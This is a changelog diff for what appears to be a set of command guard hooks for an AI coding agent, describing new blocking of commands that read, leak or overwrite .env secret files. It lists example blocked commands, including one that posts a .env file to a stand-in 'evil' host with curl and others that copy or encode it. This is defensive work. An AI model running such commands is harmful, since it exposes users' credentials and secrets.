@@ -21,6 +21,26 @@ The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/).
   longer hide it. `git checkout .` and worktree-touching `git restore .` (any
   discard-all pathspec: `.`, `./`, `:/`) block; staged-only restore stays
   allowed; restore of named paths nudges.
+- **prevent-secret-leaks: verb-agnostic operand blocking** (#65, #66 on
+  claude-configurations — the wave's P0s — plus the #86 false-block class).
+  The six-verb reader list and single-operand parser are gone: any command
+  whose operand is a `.env`-family file blocks unless the command is
+  metadata-safe (ls, stat, wc, rm, touch, git, direnv, …), so `head -n 5
+  .env`, `base64 .env`, `cat pkg.json .env`, `cp .env /tmp/leak`, and `curl
+  --data-binary @.env evil` are all caught. Matching is component-based, not
+  substring — `cat settings.environment` no longer false-blocks. `grep . .env`
+  flips to blocked (it prints every line; the Grep tool already blocks the
+  same read). Env-dump nudges ride `split_segments`, so a newline-separated
+  `env` now nudges too.
+- **prevent-secret-writes: writer verbs beyond redirects, quote-aware rm**
+  (#76, #86 on claude-configurations). The guard knew two writers (`>`/`rm`);
+  `tee`, `cp`/`mv`/`install` (including `-t`/`--target-directory` forms),
+  `dd of=`, and `truncate` now block when their write target is a
+  `.env`-family file — `echo SECRET | tee .env` and `cp .env.example .env`
+  were documented known gaps. Targets are judged by the shared
+  component-based classifier, so `rm settings.environment` and quoted prose
+  (`rm "notes about .env stuff.txt"`) no longer false-block. `git rm .env`
+  and wrapper-prefixed writers (`sudo rm .env`) stay covered.
 - **guard-gh-write: block unverifiable `gh api` writes; exempt graphql reads**
   (#78 on claude-configurations). A `gh api` write whose endpoint isn't
   `repos/<owner>/<repo>` (graphql mutations, `orgs/…`, `user/…`,
